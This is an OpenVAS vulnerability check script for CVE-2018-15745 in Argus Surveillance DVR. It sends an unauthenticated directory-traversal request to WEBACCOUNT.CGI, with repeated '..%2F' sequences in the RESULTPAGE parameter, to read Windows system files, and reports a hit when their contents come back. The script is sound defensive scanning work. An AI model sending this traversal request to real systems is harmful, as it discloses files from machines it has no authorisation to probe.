###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_argus_surveillance_dvr_mult_vuln.nasl 14078 2019-03-11 03:25:53Z ckuersteiner $
#
# Argus Surveillance DVR Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:argus_surveillance:dvr";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141409");
  script_version("$Revision: 14078 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-11 04:25:53 +0100 (Mon, 11 Mar 2019) $");
  script_tag(name:"creation_date", value:"2018-08-29 14:19:28 +0700 (Wed, 29 Aug 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2018-15745");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_name("Argus Surveillance DVR Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_argus_surveillance_dvr_detect.nasl");
  script_mandatory_keys("argus_surveillance/installed");

  script_tag(name:"summary", value:"Argus Surveillance DVR is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"Argus Surveillance DVR is prone to multiple vulnerabilities:

  - Directory traversal (CVE-2018-15745)

  - SYSTEM privilege escalation");

  script_tag(name:"solution", value:"No known solution is available as of 11th March, 2019.
  Information regarding this issue will be updated once solution details are available.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_xref(name:"URL", value:"http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-UNAUTHENTICATED-PATH-TRAVERSAL-FILE-DISCLOSURE.txt");
  script_xref(name:"URL", value:"http://hyp3rlinx.altervista.org/advisories/ARGUS-SURVEILLANCE-DVR-v4-SYSTEM-PRIVILEGE-ESCALATION.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

files = traversal_files("windows");

foreach file (keys(files)) {
  url = "/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=" + crap(data: "..%2F", length: 16*5) + files[file] +
        "&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=";

  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
